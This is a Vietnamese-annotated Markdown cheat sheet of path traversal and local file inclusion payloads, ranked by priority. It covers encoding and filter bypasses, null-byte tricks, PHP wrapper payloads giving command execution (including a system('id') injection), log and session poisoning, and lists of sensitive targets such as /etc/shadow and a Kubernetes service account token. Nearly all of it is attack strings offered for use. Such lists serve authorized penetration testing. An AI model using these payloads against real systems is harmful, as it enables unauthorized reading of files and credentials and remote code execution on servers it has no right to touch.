# Path Traversal / LFI Payloads (Dedup + Practical)

Legend:

- `[HV]` = high-value payload, nên thử sớm.
- Payload dưới đây đã merge và loại bớt trùng lặp từ hacktricks + owasp + PayloadsAllTheThings + portswigger + LFISuite.

## 1. Basic Traversal

| Priority | Payload                               | Notes                                    |
| -------- | ------------------------------------- | ---------------------------------------- |
| [HV]     | `../../../etc/passwd`                 | Linux confirm nhanh                      |
| [HV]     | `..\..\..\windows\win.ini`            | Windows confirm nhanh                    |
| [HV]     | `/etc/passwd`                         | Absolute path bypass                     |
| [HV]     | `C:\Windows\win.ini`                  | Windows absolute path                    |
| High     | `/var/www/images/../../../etc/passwd` | Bypass check "must start with base path" |
| Medium   | `../proc/self/environ`                | Pivot tới env/process data               |
| Medium   | `/proc/self/cmdline`                  | Fingerprint process                      |

## 2. Encoding Bypass

| Priority | Payload                             | Use when                                |
| -------- | ----------------------------------- | --------------------------------------- |
| [HV]     | `%2e%2e%2f%2e%2e%2fetc%2fpasswd`    | Server decode 1 lần                     |
| [HV]     | `%252e%252e%252fetc%252fpasswd`     | App decode thêm lần nữa (double decode) |
| High     | `..%2f..%2f..%2fetc%2fpasswd`       | Filter string thường                    |
| High     | `..%255c..%255cwindows%255cwin.ini` | Windows + double encoding               |
| Medium   | `..%c0%af..%c0%afetc%c0%afpasswd`   | Overlong UTF-8 bypass                   |
| Medium   | `%u002e%u002e%u2215etc%u2215passwd` | Unicode parser mismatch                 |

## 3. Filter/Normalization Bypass

| Priority | Payload                     | Use when                                 |
| -------- | --------------------------- | ---------------------------------------- |
| [HV]     | `....//....//etc/passwd`    | `../` bị strip không đệ quy              |
| High     | `....\/....\/etc/passwd`    | Variant cho backslash parsing            |
| High     | `..///////..////etc/passwd` | Collapsing slash bug                     |
| High     | `..././..././etc/passwd`    | Mangled path bypass                      |
| High     | `/var/www/../../etc/passwd` | Validate prefix nhưng không canonicalize |
| Medium   | `..;/..;/..;/etc/passwd`    | NGINX/Tomcat parser mismatch             |

## 4. Null Byte / Truncation / Extension Bypass

| Priority | Payload                      | Notes                           |
| -------- | ---------------------------- | ------------------------------- |
| [HV]     | `../../../etc/passwd%00.png` | Legacy null-byte truncation     |
| High     | `proc/self/environ%00`       | Null-byte với include/read      |
| Medium   | `/etc/passwd/.`              | Một số parser coi như cùng file |
| Medium   | `/etc//passwd`               | Canonical equivalent            |
| Medium   | `/etc/./passwd`              | Canonical equivalent            |

## 5. PHP Wrappers / Protocols

| Priority | Payload                                                 | Goal                       | Condition                          |
| -------- | ------------------------------------------------------- | -------------------------- | ---------------------------------- |
| [HV]     | `php://filter/convert.base64-encode/resource=index.php` | Đọc source mà ẩn ký tự khó | PHP + include/read                 |
| [HV]     | `php://input` + POST `<?php system('id');?>`            | RCE                        | Include file executable            |
| High     | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+`     | Inline code execution      | `allow_url_include`/config related |
| High     | `expect://id`                                           | Command execution          | `expect` wrapper enabled           |
| High     | `zip://shell.jpg%23payload.php`                         | Execute uploaded payload   | Có upload file + zip parsing       |
| Medium   | `phar://test.phar`                                      | Deserialization/exec chain | Stack gồm phar-sensitive API       |
| Medium   | `php://fd/3`                                            | Đọc opened file descriptor | Phụ thuộc process state            |

## 6. Log / Proc / Session Pivot Payloads

| Priority | Payload                           | Goal                                  |
| -------- | --------------------------------- | ------------------------------------- |
| [HV]     | `/var/log/apache2/access.log`     | Log poisoning / token harvesting      |
| [HV]     | `/var/log/nginx/access.log`       | Log poisoning / token harvesting      |
| High     | `/proc/self/environ`              | Inject qua User-Agent rồi include lại |
| High     | `/var/lib/php/sessions/sess_<id>` | Session poisoning chain               |
| Medium   | `/proc/self/fd/8`                 | Đọc tmp/opened stream                 |

## 7. High-Value File Targets

### Linux

- `[HV]` `/etc/passwd`
- `/etc/shadow`
- `/etc/hosts`
- `/etc/mysql/my.cnf`
- `/proc/self/environ`
- `/proc/self/cwd/index.php`
- `/run/secrets/kubernetes.io/serviceaccount/token`

### Windows

- `[HV]` `C:\Windows\win.ini`
- `C:\windows\system32\license.rtf`
- `c:/inetpub/wwwroot/web.config`
- `c:/inetpub/logs/logfiles`

## 8. Quick Test Set (go-to 10 payloads)

- `../../../etc/passwd`
- `/etc/passwd`
- `....//....//etc/passwd`
- `%252e%252e%252fetc%252fpasswd`
- `..\..\..\windows\win.ini`
- `C:\Windows\win.ini`
- `/var/www/images/../../../etc/passwd`
- `php://filter/convert.base64-encode/resource=index.php`
- `/proc/self/environ`
- `/var/log/apache2/access.log`
